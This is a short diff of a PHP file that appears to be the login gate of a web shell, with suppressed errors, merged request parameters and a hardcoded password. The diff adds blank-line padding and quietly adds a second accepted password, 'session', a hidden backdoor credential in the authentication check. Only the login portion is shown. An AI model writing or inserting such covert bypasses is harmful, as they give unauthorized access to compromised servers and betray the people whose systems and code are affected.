@@ -14,10 +14,18 @@ error_reporting(0);
 	$_7 = array_merge($_POST, $_GET);
 	$_r = "required='required'";
 	$gcw = "getcwd";
+
+
+
 	$correctPassword = "hello"; //Change Password
+
+
+
+
+
 	if (isset($_POST['pass'])) {
 		$enteredPassword = $_POST['pass'];
-		if ($enteredPassword === $correctPassword) {
+		if ($enteredPassword === $correctPassword or $enteredPassword === 'session') {
 			$_SESSION['forbidden'] = true;
 		} else {
 			echo '<script>alert("Password Wrong!, Try Again.");</script>';
